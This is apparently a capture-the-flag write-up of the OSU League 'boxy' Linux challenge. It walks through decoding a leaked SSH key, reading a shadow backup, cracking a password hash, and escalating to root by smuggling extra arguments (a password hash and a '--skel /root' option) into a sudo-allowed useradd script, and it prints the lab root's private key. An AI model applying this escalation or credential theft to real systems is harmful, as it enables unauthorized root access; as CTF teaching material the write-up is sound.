---
title: "OSU League 2020/2021 - boxy Writeup"
date: 2021-03-01
draft: false
description: ""
tags: ["ctf"]
---
## Writeup
> Time to poke at a linux box and see what there is to find. Im going to give you the flag right now, and the program to decrypt it too!
> You will have to find 7 flags to solve this challenge! They will be combined through Shamir Secret Sharing, and allow you to decrypt the flag!

For this challenge, we worked in one large group taking turns to solve various parts of the box.  Because of this, and because of the poor documentation we had while solving the box, some of the solutions we came up with are going to be a bit fuzzy in this writeup.

To start, we are given an IP address of a linux box, so let's do what every pentester must do and give that boy an nmap:

```
Starting Nmap 7.70 ( https://nmap.org ) at 2021-02-26 18:15 PST
Nmap scan report for 172.17.0.2
Host is up (0.00030s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE
1337/tcp  open  waste
13337/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 3.76 seconds
```

Great! We have two open ports, let's netcat to them to see what's up.

Connection to port 1337, we get this:

```
SSH Backup service, Key requested... Implementing security... done... sending...
SWhJaHVpZHNkSWhJaDtnc2RlZHNoYmo7TVIxdU1SMEJTVGVLVWhDUVREV05UME9ISEdDUlJXW0NXRFRmUjFXW01SMXVNUjFKWGtPQmNGS3RVb3FpUHtHeFZtaXNlRlNwU1RHQ1BUR0NQamIwZWxLdVdUR0NQVEdHWGwxNGVXcVNQVEdDUFRHQ1BUR0NQakdDUFRHT2UxR0NQVEcxZGxMeFsyU2BXdnFTZFQ0VFdZaVFUVEdDUFRPQlhsU2xYVmIzWGxHbmNHaTVSMkB2VGxbRWNVbXtSMk9yWzBDMltEdWBiSWltZWtXc1cybXRbSVdoVFRHQ1BUcURlVmlKW1Y5MmMwT1hCb0dDUFRHQ1BZUzdYe0tvZUdxWVRZbU5XR1c1VTBHQ1BUR0VQbEtqW2xHb09sS2lgRnlYZER1dkxHS2xQMzE0YjF1e2NGZVBlM1NNVm9DNVtZWDBgMGU0Y2xTMFhtREpQVEdDU1RPM2BUW3dTR3EwVFVpb1t4dWtWbEwxV2tLSFRUTzJOR21PWFdxamVHW1ZNMk9VTzFPcmMzU1BgVDByZUVENGJUU3ZlSUdJV2xbR2JWNFJTa2lNWGtLMmJQcTRXMUR3UGtDdmNWNEZPaDh1VGxLTVtFSDBlREdDUFRHRUwxcUNYe09WYDNIe1tJW2hMbUszUFdHS1FQbnVNUjF1TVRXTlNCQ1FURFdOVDBPSEhHQ1JSV1tDV0RUZlIxV1tNUjF1TVIxSjspMy0wOTgzODMxNTE2ODI5NTk0OTYzODI3NDU1MzIzNzU5MDI5ODMxNSg=
goodbye!
```

Interesting... let's do it again:

```
SSH Backup service, Key requested... Implementing security... done... sending...
FjcWNyo2Oyw7FjcWN2Q4LDs6Oyw3PTVkEg1uKhINbx0MCzoUCjccDgsbCBELbxAXFxgcDQ0IBBwIGws5DW4IBBINbioSDW4VBzQQHTwZFCsKMC42DyQYJwkyNiw6GQwvDAsYHA8LGBwPNT1vOjMUKggLGBwPCxgYBzNuazoILgwPCxgcDwsYHA8LGBwPNRgcDwsYEDpuGBwPCxhuOzMTJwRtDD8IKS4MOwtrCwgGNg4LCxgcDwsQHQczDDMHCT1sBzMYMTwYNmoNbR8pCzMEGjwKMiQNbRAtBG8cbQQbKj89FjYyOjQILAhtMisEFgg3CwsYHA8LLhs6CTYVBAlmbTxvEAcdMBgcDwsYHA8GDGgHJBQwOhguBgsGMhEIGAhqCm8YHA8LGBoPMxQ1BDMYMBAzFDY/GSYHOxsqKRMYFDMPbG5rPW4qJDwZOg86bAwSCTAcagQGB28/bzprPDMMbwcyGxUPCxgcDAsQbD8LBCgMGC5vCwo2MAQnKjQJMxNuCDQUFwsLEG0RGDIQBwguNToYBAkSbRAKEG4QLTxsDA8/C28tOhobaz0LDCk6FhgWCDMEGD0Jaw0MNDYSBzQUbT0PLmsIbhsoDzQcKTwJaxkQN2cqCzMUEgQaF286GxgcDwsYGhNuLhwHJBAJP2wXJAQWBDcTMhRsDwgYFA4PMSoSDW4qEgsIEQwdHA4LGwgRC28QFxcYHA0NCAQcCBsLOQ1uCAQSDW4qEg1uFWR2bHJvZmdsZ2xuam5pZ21mamZrZmlsZ21oa2pqbG1saGpmb21mZ2xuanc=
goodbye!
```

We did this a few more times until one of us decided to compare some in hex:

```
16 37 16 37 2a 36 3b 2c 3b 16 37 16 37 64 38 2c 3b 3a 3b 2c 37 3d 35 64 12 0d 6e 2a 12 0d 6f 1d 0c 0b 3a 14 0a 37 1c 0e 0b 1b 08 11 0b 6f 10 17 17 18 1c 0d 0d 08 04 1c 08 1b 0b 39 0d 6e 08 04 12 0d 6e 2a 12 0d 6e 15 07 34 10 1d 3c 19 14 2b 0a 30 2e 36 0f 24 18 27 09 32 36 2c 3a 19 0c 2f 0c 0b 18 1c 0f 0b 18 1c 0f 35 3d 6f 3a 33 14 2a 08 0b 18 1c 0f 0b 18 18 07 33 6e 6b 3a 08 2e 0c 0f 0b 18 1c 0f 0b 18 1c 0f 0b 18 1c 0f 35 18 1c 0f 0b 18 10 3a 6e 18 1c 0f 0b 18 6e 3b 33 13 27 04 6d 0c 3f 08 29 2e 0c 3b 0b 6b 0b 08 06 36 0e 0b 0b 18 1c 0f 0b 10 1d 07 33 0c 33 07 09 3d 6c 07 33 18 31 3c 18 36 6a 0d 6d 1f 29 0b 33 04 1a 3c 0a 32 24 0d 6d 10 2d 04 6f 1c 6d 04 1b 2a 3f 3d 16 36 32 3a 34 08 2c 08 6d 32 2b 04 16 08 37 0b 0b 18 1c 0f 0b 2e 1b 3a 09 36 15 04 09 66 6d 3c 6f 10 07 1d 30 18 1c 0f 0b 18 1c 0f 06 0c 68 07 24 14 30 3a 18 2e 06 0b 06 32 11 08 18 08 6a 0a 6f 18 1c 0f 0b 18 1a 0f 33 14 35 04 33 18 30 10 33 14 36 3f 19 26 07 3b 1b 2a 29 13 18 14 33 0f 6c 6e 6b 3d 6e 2a 24 3c 19 3a 0f 3a 6c 0c 12 09 30 1c 6a 04 06 07 6f 3f 6f 3a 6b 3c 33 0c 6f 07 32 1b 15 0f 0b 18 1c 0c 0b 10 6c 3f 0b 04 28 0c 18 2e 6f 0b 0a 36 30 04 27 2a 34 09 33 13 6e 08 34 14 17 0b 0b 10 6d 11 18 32 10 07 08 2e 35 3a 18 04 09 12 6d 10 0a 10 6e 10 2d 3c 6c 0c 0f 3f 0b 6f 2d 3a 1a 1b 6b 3d 0b 0c 29 3a 16 18 16 08 33 04 18 3d 09 6b 0d 0c 34 36 12 07 34 14 6d 3d 0f 2e 6b 08 6e 1b 28 0f 34 1c 29 3c 09 6b 19 10 37 67 2a 0b 33 14 12 04 1a 17 6f 3a 1b 18 1c 0f 0b 18 1a 13 6e 2e 1c 07 24 10 09 3f 6c 17 24 04 16 04 37 13 32 14 6c 0f 08 18 14 0e 0f 31 2a 12 0d 6e 2a 12 0b 08 11 0c 1d 1c 0e 0b 1b 08 11 0b 6f 10 17 17 18 1c 0d 0d 08 04 1c 08 1b 0b 39 0d 6e 08 04 12 0d 6e 2a 12 0d 6e 15 64 76 6c 72 6f 66 67 6c 67 6c 6e 6a 6e 69 67 6d 66 6a 66 6b 66 69 6c 67 6d 68 6b 6a 6a 6c 6d 6c 68 6a 66 6f 6d 66 67 6c 6e 6a 77
```

```
81 a0 81 a0 bd a1 ac bb ac 81 a0 81 a0 f3 af bb ac ad ac bb a0 aa a2 f3 85 9a f9 bd 85 9a f8 8a 9b 9c ad 83 9d a0 8b 99 9c 8c 9f 86 9c f8 87 80 80 8f 8b 9a 9a 9f 93 8b 9f 8c 9c ae 9a f9 9f 93 85 9a f9 bd 85 9a f9 82 90 a3 87 8a ab 8e 83 bc 9d a7 b9 a1 98 b3 8f b0 9e a5 a1 bb ad 8e 9b b8 9b 9c 8f 8b 98 9c 8f 8b 98 a2 aa f8 ad a4 83 bd 9f 9c 8f 8b 98 9c 8f 8f 90 a4 f9 fc ad 9f b9 9b 98 9c 8f 8b 98 9c 8f 8b 98 9c 8f 8b 98 a2 8f 8b 98 9c 8f 87 ad f9 8f 8b 98 9c 8f f9 ac a4 84 b0 93 fa 9b a8 9f be b9 9b ac 9c fc 9c 9f 91 a1 99 9c 9c 8f 8b 98 9c 87 8a 90 a4 9b a4 90 9e aa fb 90 a4 8f a6 ab 8f a1 fd 9a fa 88 be 9c a4 93 8d ab 9d a5 b3 9a fa 87 ba 93 f8 8b fa 93 8c bd a8 aa 81 a1 a5 ad a3 9f bb 9f fa a5 bc 93 81 9f a0 9c 9c 8f 8b 98 9c b9 8c ad 9e a1 82 93 9e f1 fa ab f8 87 90 8a a7 8f 8b 98 9c 8f 8b 98 91 9b ff 90 b3 83 a7 ad 8f b9 91 9c 91 a5 86 9f 8f 9f fd 9d f8 8f 8b 98 9c 8f 8d 98 a4 83 a2 93 a4 8f a7 87 a4 83 a1 a8 8e b1 90 ac 8c bd be 84 8f 83 a4 98 fb f9 fc aa f9 bd b3 ab 8e ad 98 ad fb 9b 85 9e a7 8b fd 93 91 90 f8 a8 f8 ad fc ab a4 9b f8 90 a5 8c 82 98 9c 8f 8b 9b 9c 87 fb a8 9c 93 bf 9b 8f b9 f8 9c 9d a1 a7 93 b0 bd a3 9e a4 84 f9 9f a3 83 80 9c 9c 87 fa 86 8f a5 87 90 9f b9 a2 ad 8f 93 9e 85 fa 87 9d 87 f9 87 ba ab fb 9b 98 a8 9c f8 ba ad 8d 8c fc aa 9c 9b be ad 81 8f 81 9f a4 93 8f aa 9e fc 9a 9b a3 a1 85 90 a3 83 fa aa 98 b9 fc 9f f9 8c bf 98 a3 8b be ab 9e fc 8e 87 a0 f0 bd 9c a4 83 85 93 8d 80 f8 ad 8c 8f 8b 98 9c 8f 8d 84 f9 b9 8b 90 b3 87 9e a8 fb 80 b3 93 81 93 a0 84 a5 83 fb 98 9f 8f 83 99 98 a6 bd 85 9a f9 bd 85 9c 9f 86 9b 8a 8b 99 9c 8c 9f 86 9c f8 87 80 80 8f 8b 9a 9a 9f 93 8b 9f 8c 9c ae 9a f9 9f 93 85 9a f9 bd 85 9a f9 82 f3 e1 fb e5 f8 f1 f0 fb f0 fb f9 fd f9 fe f0 fa f1 fd f1 fc f1 fe fb f0 fa ff fc fd fd fb fa fb ff fd f1 f8 fa f1 f0 fb f9 fd e0
```

This is interesting! We can see that the first 4 bytes repeat! `16 37 16 37` and `81 a0 81 a0`.  Our ~~god-like guess skills~~ intuition told us that this is being XORed with a random key, so let's bruteforce our way to solution:

```
Key = 01: iHithereHiHi:frederick:LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNCYmRmYWc2YmFobFh4S3AwUmZDbTlzS3NsZ1B3ZEtacHhldjVrV3luZHViUUFBQUpEdWhKZW83b1NYCnFBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQmJkZmFnNmJhaGxYeEtwMFJmQ205c0tzbGdQd2RLWnB4ZXY1a1d5bmR1YlEKQUFBRUN2aUZvRFp1UThnZytjWmM0VjJIUUN3OFlNYVpkdFZWL3NTN0Nsb2RQaU1sdDE5cURwdHFHVmZFcW5SRjhLYjJ3cQp5V0EvQjBwbW5GNi9tUmJLZDI1dEFBQUFDM0pBYzNWa2IzZHZiMlJ2QVFJPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K:(2,18929204079384858729365442326481389204)
```
We get the first flag: `(2,18929204079384858729365442326481389204)`, sweet. We also have a name `fredercik`, along with a long string that sort of looks like a key when you convert it to base64, but we'll save that for in a bit.

Connecting to the other port, port 13337, we see that it's actually just OpenSSH. So let's try to connect to it with that name and key we got from the last step to see if we can get into the box.

```
$ ssh -i key frederick@3.138.157.23 -p 13337

$ whoami
Frederick
```

Alright, we are in! Right away we see two files in Fred's home directory: `password_guide` and `top_100_password_ideas`. Cating out `password_guide` we see:

```
Hi,

To make a strong password, pick one from the list I included and add 2 digits onto the end!
```

Neat, so it seems like their "strong password" is just going to be one of the hundred in that list + 2 digits, which to brute force is only 10,000 passwords.  But what will be be brute forcing exactly?

After doing some more enumeration on the box, we notice that Frederick has read access to `shadow.bak`, a backup of the file that stores the encrypted passwords for all users. Taking a look at this gives us a pretty good idea of what password we need to crack:

```
root:!(5,27562576550131620089134738750424271702):18644:0:99999:7:::
daemon:*:18644:0:99999:7:::
bin:*:18644:0:99999:7:::
sys:*:18644:0:99999:7:::
sync:*:18644:0:99999:7:::
games:*:18644:0:99999:7:::
man:*:18644:0:99999:7:::
lp:*:18644:0:99999:7:::
mail:*:18644:0:99999:7:::
news:*:18644:0:99999:7:::
uucp:*:18644:0:99999:7:::
proxy:*:18644:0:99999:7:::
www-data:*:18644:0:99999:7:::
backup:*:18644:0:99999:7:::
list:*:18644:0:99999:7:::
irc:*:18644:0:99999:7:::
gnats:*:18644:0:99999:7:::
nobody:*:18644:0:99999:7:::
_apt:*:18644:0:99999:7:::
systemd-timesync:*:18644:0:99999:7:::
systemd-network:*:18644:0:99999:7:::
systemd-resolve:*:18644:0:99999:7:::
messagebus:*:18644:0:99999:7:::
sshd:*:18644:0:99999:7:::
systemd-coredump:!!:18644::::::
frederick:!:18683:0:99999:7:::
oldadmin:$6$S73ABQAuFHt.hyVw$2SB2MgTdEf5W2exQzr4kpgpvZ30lUubEPGlNkKlXYLxbPn7TG1IFh9aBzZrJ4VfYcymewmwJaW9WC3RKUVZKx/:18683:0:99999:7:::
```

Not only that, but we get our second flag! `(5,27562576550131620089134738750424271702)` 

So at this point it's clear that we need to get access to oldadmin. We can use johntheripper with our knowledge of how the passwords are choosen to quickly crack the pass:

After tinkering with john for a bit, we were eventually able to recover the password: `freedom42`. We now are able to SU to oldadmin with that password :)

As `oldadmin`, we continued to do a bit more enumeration. Looking through /etc/, we were able to cat out the `sudoers` files:

```
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Allow members of group sudo to execute any command

%sudo   ALL=(ALL:ALL) ALL


oldadmin ALL=(root) NOPASSWD:/root/script/adopt_dog
# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
```

Seems like as oldadmin we can run `/root/script/adopt_dog` without needing root's password! Let's check that out:

```
#!/bin/bash

userdel dog
rm -rf /home/dog

ARGS=$(echo "$@" | tr "\\\\()<>\`" " ")

groupadd dog
useradd -g dog $ARGS -g dog -G dog -m -d /home/dog dog
```

This script seems to take in any number of arguments (minus a few special blacklist characters), and then runs them with `useradd` to create a new user `dog`.  Trying it out, we do see that it does indeed create that dog user and a home directory for it, but how do we *become* the dog? Well, since we have control over the arguments that are excecuted, we can just provide it with the encrypted password and then SU into the new user. Let's try it out:

```
$ sudo ./adopt_dog -p $(echo "boop" | openssl passwd -1 -stdin)
$ su dog
Password:
$ whoami
dog
```

Neato! We are now a dog ~~my wildest dreams have come true~~. What can we do with our newfound powers? Well, we can go check out our home!

Going to our home directory, we see.... a flag? `(6,103859969563713920733890450469614298693)`.

That's great and all, but where in the world did it come from? The script we ran didn't move anything into the home directory, and there is no cron job that's updating this directory with the flag.  Well it's because of `/etc/skel`, which is one of the open parameters in the adopt_dog script. So the script checks `/etc/skel` by default, and anything in that directory get's placed into dog's home directory. Since we have control over that parameter, we can actually tell the script to include any directory we want with `--skel` and we will be able to read it! Let's do it with the root directory and see if we can get root's private ssh keys.

SUing into dog again, we can now view all of root's files, including a `flag` file in their `.ssh` directory! `(7,115317666936746434141387300928816667814)` 

We also have root's private keys, so we can just ssh into root whenever we want, sweet!

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACA8/OKb2sIToYOGTKGRNcUTYFLZF+cp7JVqqWioCrfWAgAAAJBRR7KIUUey
iAAAAAtzc2gtZWQyNTUxOQAAACA8/OKb2sIToYOGTKGRNcUTYFLZF+cp7JVqqWioCrfWAg
AAAECMbmo1F61KDqpoOr0f7JKJ0+dmSZuVZETjuQfWyDhhajz84pvawhOhg4ZMoZE1xRNg
UtkX5ynslWqpaKgKt9YCAAAAC3JAc3Vkb3dvb2RvAQI=
-----END OPENSSH PRIVATE KEY-----
```

Checking out the rest of root's files, we get another flag in `.bashrc`: `(1,41771917274972003437877223622233833933)` (This one had us stumped for a bit, our inner guess gods let us down on this one) 

We also did a bit more enumeration, specifically on the services that were running, and we found that there was running service on port 1338 that could only be reached through the localhost.  Netcating to that service gave us our second to last flag! `(3,66827439388718004166721471471671102060)`  

At this point, we have done pretty much everything we could without root privilages, so let's use that key we got earlier to ssh into root. 

After even more enumeration and random guessing later, we found that root has access to the a file `/opt/what/this/is/interesting/follow/this/path/to/get/a/flag/where/does/it/end/wow/this/is/taking/a/while/hmm/okay/tap/tap/tap/tap/tap/tap/hmm/here/you/go/lol/flag`. A bunch of tabs presses later, and we get our last flag:  `(4,121577997023255799331813434873849479391)` 

Phew! We can now put all these flags in shares.cvs, run the python script to decrypt the flag, and BOOM: 

```
osu{Shamir_makes_me_sad_but_linux_scavenger_hunt_makes_me_glad}
```

Woop!
